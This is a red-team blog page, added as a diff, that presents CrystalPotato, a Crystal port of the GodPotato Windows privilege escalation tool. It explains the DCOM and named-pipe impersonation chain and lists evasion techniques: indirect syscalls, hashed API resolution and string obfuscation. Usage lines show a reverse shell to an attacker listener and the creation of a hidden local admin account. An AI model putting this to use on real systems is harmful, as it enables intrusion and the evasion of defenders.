@@ -1,0 +1,270 @@
+# https://ricardojoserf.github.io/crystalpotato/
+
+<!DOCTYPE html><html>
+
+  <body>
+    <div class="wrapper-masthead">
+      <div class="container">
+        
+      </div>
+    </div>
+
+    <div id="main" role="main" class="container">
+      <article class="post">
+  <h1 class="post-title">CrystalPotato - GodPotato in Crystal</h1>
+
+  <div class="post-meta">
+    <time datetime="2026-09-01T00:00:00+00:00">September  1, 2026</time>
+    
+      <span class="post-categories">
+        
+          <a class="category-chip" href="https://ricardojoserf.github.io/categories/#tools">Tools</a>
+        
+          <a class="category-chip" href="https://ricardojoserf.github.io/categories/#red-team">Red Team</a>
+        
+          <a class="category-chip" href="https://ricardojoserf.github.io/categories/#malware-development">Malware Development</a>
+        
+      </span>
+    
+  </div>
+
+  <div class="entry">
+    <p>CrystalPotato is a Crystal port of GodPotato, a local privilege escalation tool that abuses the DCOM OXID Resolver and named pipe impersonation to escalate from service accounts with <code class="language-plaintext highlighter-rouge">SeImpersonatePrivilege</code> to <code class="language-plaintext highlighter-rouge">NT AUTHORITY\SYSTEM</code>.</p>
+
+<!--more-->
+
+<p>Repository: <a href="https://github.com/ricardojoserf/CrystalPotato">https://github.com/ricardojoserf/CrystalPotato</a></p>
+
+<p align="center"><img src="https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/CrystalPotato/Screenshot_1.png" alt="CrystalPotato" width="420"></p>
+
+<p><br></p>
+
+<hr>
+
+<h2 id="background">Background</h2>
+
+<p><a href="https://github.com/BeichenDream/GodPotato">GodPotato</a> is a well-known privilege escalation technique that works across a wide range of Windows versions (8 through 11, Server 2012 through 2022). It targets any process running with <code class="language-plaintext highlighter-rouge">SeImpersonatePrivilege</code>, which includes IIS application pools, MSSQL service accounts, Network Service and Local Service. The original tool is written in C# and, while effective, carries the usual .NET trade-offs: it requires the CLR, is easy to decompile, and its strings and class names are trivially visible in the assembly metadata.</p>
+
+<p>I ported it to Crystal to produce a binary with a smaller forensic footprint, and I tested it on Windows 10, 11 and Server 2025.</p>
+
+<p><br></p>
+
+<hr>
+
+<h2 id="why-crystal">Why Crystal</h2>
+
+<p><a href="https://crystal-lang.org/">Crystal</a> is a statically typed, compiled language with Ruby-like syntax. It compiles to native code via LLVM, producing standalone executables with no runtime dependency. Several properties make it interesting for offensive development:</p>
+
+<ul>
+  <li>
+    <p><strong>Native binaries</strong>: Crystal compiles to a single PE on Windows with no interpreter, VM or runtime to deploy alongside it.</p>
+  </li>
+  <li>
+    <p><strong>Compile-time macros</strong>: Crystal’s macro system executes arbitrary logic at compile time, which can be used for string obfuscation, code generation and other transformations that happen before the binary is produced.</p>
+  </li>
+  <li>
+    <p><strong>Inline assembly</strong>: Crystal supports LLVM inline assembly with AT&amp;T syntax, register constraints and clobber lists, which enables implementing indirect syscall stubs and PEB walking entirely within Crystal source files.</p>
+  </li>
+  <li>
+    <p><strong>Direct C interop</strong>: Crystal can call C functions and Windows API functions directly through its <code class="language-plaintext highlighter-rouge">lib</code> FFI bindings, with no wrapper libraries needed.</p>
+  </li>
+  <li>
+    <p><strong>Low analyst familiarity</strong>: Crystal is rarely seen in malware samples, which means analysts and automated tooling are less likely to have signatures or heuristics tuned for Crystal-compiled binaries.</p>
+  </li>
+  <li>
+    <p><strong>No reflection metadata</strong>: Unlike .NET assemblies, Crystal binaries do not embed rich type metadata that can be trivially decompiled back to source code.</p>
+  </li>
+</ul>
+
+<p><br></p>
+
+<hr>
+
+<h2 id="the-technique">The Technique</h2>
+
+<p>The privilege escalation chain used by CrystalPotato (and the original GodPotato) works as follows:</p>
+
+<ol>
+  <li>
+    <p><strong>RPC hook</strong>: The tool locates the OXID Resolver’s RPC dispatch table inside <code class="language-plaintext highlighter-rouge">combase.dll</code> by searching for the well-known interface GUID. It then patches the first entry in the dispatch table to redirect <code class="language-plaintext highlighter-rouge">UseProtseq</code> calls to a custom hook function.</p>
+  </li>
+  <li>
+    <p><strong>Named pipe server</strong>: A named pipe is created with a permissive DACL. The hook function injects the pipe’s endpoint address into the RPC binding, causing the OXID Resolver (running as SYSTEM) to connect to our pipe.</p>
+  </li>
+  <li>
+    <p><strong>DCOM trigger</strong>: A COM object is marshaled and then unmarshaled with a crafted <code class="language-plaintext highlighter-rouge">OBJREF</code> structure pointing to <code class="language-plaintext highlighter-rouge">127.0.0.1</code> over TCP. This forces the OXID Resolver to resolve the object reference, which triggers the hooked <code class="language-plaintext highlighter-rouge">UseProtseq</code> function.</p>
+  </li>
+  <li>
+    <p><strong>Token capture</strong>: When SYSTEM connects to the named pipe, <code class="language-plaintext highlighter-rouge">ImpersonateNamedPipeClient</code> captures its security context. The tool then enumerates all system handles to find a SYSTEM token with <code class="language-plaintext highlighter-rouge">Impersonation</code> level and sufficient integrity, duplicates it, and uses it to create a new process via <code class="language-plaintext highlighter-rouge">CreateProcessAsUserW</code> (falling back to <code class="language-plaintext highlighter-rouge">CreateProcessWithTokenW</code>).</p>
+  </li>
+</ol>
+
+<p>The entire chain runs in-process with no child process spawned until the final action. Once the SYSTEM token is obtained, CrystalPotato supports three modes: <strong>command execution</strong> (run a command and capture its output), <strong>reverse shell</strong> (connect back to a listener and bridge a shell’s I/O over the socket), and <strong>local admin creation</strong> (<code class="language-plaintext highlighter-rouge">net user</code> + <code class="language-plaintext highlighter-rouge">net localgroup Administrators</code>).</p>
+
+<p><br></p>
+
+<hr>
+
+<h2 id="opsec-hardening">OPSEC Hardening</h2>
+
+<p>The main contribution of this port beyond the language change is a set of OPSEC improvements designed to reduce the binary’s signature surface.</p>
+
+<p><br></p>
+
+<h3 id="indirect-syscalls">Indirect Syscalls</h3>
+
+<p>CrystalPotato does not call <code class="language-plaintext highlighter-rouge">Nt*</code> functions through ntdll’s exports. Instead, it resolves each syscall’s System Service Number (SSN) at runtime using the Exception Directory technique described by <a href="https://www.mdsec.co.uk/2022/04/resolving-system-service-numbers-using-the-exception-directory/">MDSec</a>:</p>
+
+<ol>
+  <li>Walk the PEB’s <code class="language-plaintext highlighter-rouge">InLoadOrderModuleList</code> to find ntdll’s base address.</li>
+  <li>Read ntdll’s Exception Directory (<code class="language-plaintext highlighter-rouge">IMAGE_DATA_DIRECTORY[3]</code>), which lists every function’s start address in order.</li>
+  <li>For each runtime function entry, look up the matching export name. Functions prefixed with <code class="language-plaintext highlighter-rouge">Zw</code> are syscall stubs; their position in the sorted exception table determines their SSN.</li>
+  <li>When the target hash matches, record the SSN and the function’s address.</li>
+</ol>
+
+<p>With the SSN in hand, a 21-byte stub is written to a <code class="language-plaintext highlighter-rouge">PAGE_EXECUTE_READWRITE</code> region (allocated once during init):</p>
+
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">mov</span> <span class="nv">r10</span><span class="p">,</span> <span class="nb">rcx</span>          <span class="c1">; standard syscall ABI</span>
+<span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">SS</span><span class="nv">N</span><span class="o">&gt;</span>        <span class="c1">; system service number</span>
+<span class="nf">mov</span> <span class="nv">r11</span><span class="p">,</span> <span class="o">&lt;</span><span class="nv">ntdll</span><span class="o">+</span><span class="mh">0x12</span><span class="o">&gt;</span> <span class="c1">; jump target inside ntdll's syscall stub</span>
+<span class="nf">jmp</span> <span class="nv">r11</span>               <span class="c1">; indirect jump — the syscall instruction executes inside ntdll</span>
+</code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">jmp</code> lands at <code class="language-plaintext highlighter-rouge">ntdll!NtXxx+0x12</code>, which is the <code class="language-plaintext highlighter-rouge">syscall</code> instruction inside the legitimate stub. This means the actual <code class="language-plaintext highlighter-rouge">syscall</code> executes from ntdll’s <code class="language-plaintext highlighter-rouge">.text</code> section, making the call indistinguishable from a normal ntdll invocation from the kernel’s perspective. Unlike direct syscalls, this approach does not trigger EDR detections based on the return address being outside ntdll.</p>
+
+<p>The ten syscalls resolved this way are: <code class="language-plaintext highlighter-rouge">NtClose</code>, <code class="language-plaintext highlighter-rouge">NtQuerySystemInformation</code>, <code class="language-plaintext highlighter-rouge">NtOpenProcess</code>, <code class="language-plaintext highlighter-rouge">NtOpenProcessToken</code>, <code class="language-plaintext highlighter-rouge">NtOpenThreadToken</code>, <code class="language-plaintext highlighter-rouge">NtDuplicateToken</code>, <code class="language-plaintext highlighter-rouge">NtQueryInformationToken</code>, <code class="language-plaintext highlighter-rouge">NtDuplicateObject</code>, <code class="language-plaintext highlighter-rouge">NtWaitForSingleObject</code> and <code class="language-plaintext highlighter-rouge">NtProtectVirtualMemory</code>.</p>
+
+<p><br></p>
+
+<h3 id="dynamic-api-resolution">Dynamic API Resolution</h3>
+
+<p>Beyond syscalls, CrystalPotato also resolves all sensitive Win32 API functions dynamically at runtime instead of linking them statically. This keeps function names like <code class="language-plaintext highlighter-rouge">CreateNamedPipeW</code>, <code class="language-plaintext highlighter-rouge">ImpersonateNamedPipeClient</code>, <code class="language-plaintext highlighter-rouge">CreateProcessAsUserW</code>, <code class="language-plaintext highlighter-rouge">CreateProcessWithTokenW</code> and <code class="language-plaintext highlighter-rouge">ConvertStringSecurityDescriptorToSecurityDescriptorW</code> out of the binary’s Import Address Table entirely.</p>
+
+<p>Resolution works by walking the PEB to find each DLL’s base address, then parsing its export table and matching function names against precomputed DJB2 hashes. The DJB2 hash function uses uppercase normalization (<code class="language-plaintext highlighter-rouge">h = 5381; h = ((h &lt;&lt; 5) + h) + upper(c)</code>) so comparisons are case-insensitive.</p>
+
+<p>The only functions that remain in the IAT are those needed for COM marshaling (ole32), memory management (GlobalAlloc/Lock/Unlock), pipe creation for stdout capture (CreatePipe), thread creation, and Winsock networking for the reverse shell mode (ws2_32) — none of which are individually suspicious.</p>
+
+<p><br></p>
+
+<h3 id="compile-time-string-obfuscation">Compile-Time String Obfuscation</h3>
+
+<p>All strings that reveal the tool’s behavior are XOR-obfuscated at compile time using a Crystal macro. The <code class="language-plaintext highlighter-rouge">obf()</code> macro takes a string literal, XORs each byte with a fixed key at compile time, and emits the encoded bytes as a constant array. At runtime, the bytes are decoded back to a string. This means the plaintext strings never appear in the binary’s <code class="language-plaintext highlighter-rouge">.rdata</code> section.</p>
+
+<p>The obfuscated strings include: named pipe paths, protocol identifiers (<code class="language-plaintext highlighter-rouge">ncacn_ip_tcp</code>, <code class="language-plaintext highlighter-rouge">ncacn_np</code>), SDDL security descriptors, well-known SIDs (<code class="language-plaintext highlighter-rouge">S-1-5-18</code>), IP addresses (<code class="language-plaintext highlighter-rouge">127.0.0.1</code>), command-line flag definitions, all debug and error messages, and all exception strings.</p>
+
+<p>Usage is transparent:</p>
+
+<div class="language-crystal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">combase_name</span> <span class="o">=</span> <span class="n">obf</span><span class="p">(</span><span class="s2">"combase.dll"</span><span class="p">).</span><span class="nf">to_utf16</span>
+</code></pre></div></div>
+
+<p><br></p>
+
+<h3 id="rtti-name-sanitization">RTTI Name Sanitization</h3>
+
+<p>Crystal embeds struct and class names as RTTI metadata in the compiled binary. Names like <code class="language-plaintext highlighter-rouge">RpcServerInterface</code>, <code class="language-plaintext highlighter-rouge">RpcDispatchTable</code>, <code class="language-plaintext highlighter-rouge">MidlServerInfo</code> or <code class="language-plaintext highlighter-rouge">SystemHandleTableEntryInfoEx</code> immediately tell an analyst what the tool is doing. All structs with revealing names have been renamed to short, meaningless identifiers (<code class="language-plaintext highlighter-rouge">Ri</code>, <code class="language-plaintext highlighter-rouge">Rd</code>, <code class="language-plaintext highlighter-rouge">Mi</code>, <code class="language-plaintext highlighter-rouge">He</code>, etc.) that carry no semantic information.</p>
+
+<p><br></p>
+
+<h3 id="silent-by-default">Silent by Default</h3>
+
+<p>By default, the tool produces no output other than the executed command’s stdout. Diagnostic messages are gated behind two debug levels: <code class="language-plaintext highlighter-rouge">-d</code> shows operational progress (hook status, pipe events, token search result), while <code class="language-plaintext highlighter-rouge">-dd</code> adds the full internal trace (SSN resolution, handle table walks, syscall return codes). A successful execution with no flags leaves no console artifacts beyond the command output itself.</p>
+
+<p><br></p>
+
+<hr>
+
+<h2 id="build">Build</h2>
+
+<p>CrystalPotato compiles to a single file with no dependencies. I recommend using <a href="https://crystal-lang.org/install/on_windows/">Crystal on Windows</a> instead of cross-compilation:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crystal build CrystalPotato.cr -o CrystalPotato.exe --release --static
+</code></pre></div></div>
+
+<p><br></p>
+
+<hr>
+
+<h2 id="usage">Usage</h2>
+
+<p>Execute a command, start a reverse shell, or create a local admin:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>CrystalPotato.exe -c &lt;COMMAND&gt;
+CrystalPotato.exe -H &lt;LHOST&gt; -P &lt;LPORT&gt; [-c &lt;SHELL&gt;]
+CrystalPotato.exe -u &lt;USER&gt; -pw &lt;PASS&gt;
+</code></pre></div></div>
+
+<table>
+  <thead>
+    <tr>
+      <th>Flag</th>
+      <th>Description</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-c CMD</code></td>
+      <td>Command to execute as SYSTEM, or shell for reverse shell (default: <code class="language-plaintext highlighter-rouge">cmd.exe</code>)</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-H HOST</code></td>
+      <td>Reverse shell listener Host</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-P PORT</code></td>
+      <td>Reverse shell listener Port</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-u USER</code></td>
+      <td>Create local admin - Username</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-pw PASS</code></td>
+      <td>Create local admin - Password</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-p NAME</code></td>
+      <td>Custom pipe name (default: <code class="language-plaintext highlighter-rouge">Crystal</code>)</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-d</code></td>
+      <td>Debug output</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-dd</code></td>
+      <td>Full trace</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-h</code></td>
+      <td>Show help</td>
+    </tr>
+  </tbody>
+</table>
+
+<p><img src="https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/CrystalPotato/Screenshot_2.png" alt="CrystalPotato" width="720"></p>
+
+<p><br></p>
+
+<hr>
+
+<h2 id="sources">Sources</h2>
+
+<ul>
+  <li><a href="https://github.com/BeichenDream/GodPotato">GodPotato</a> - Original C# implementation by <a href="https://github.com/BeichenDream">BeichenDream</a>.</li>
+  <li><a href="https://github.com/safedv/RustPotato">RustPotato</a> - Rust implementation by <a href="https://github.com/safedv">safedv</a>.</li>
+  <li><a href="https://github.com/tylerdotrar/SigmaPotato">SigmaPotato</a> - C# implementation with extra functionalities by <a href="https://github.com/tylerdotrar">tylerdotrar</a>.</li>
+</ul>
+
+  </div>
+</article>
+
+    </div>
+
+    <div class="wrapper-footer">
+      <div class="container">
+        
+      </div>
+    </div>
+
+  
+
+</body></html>
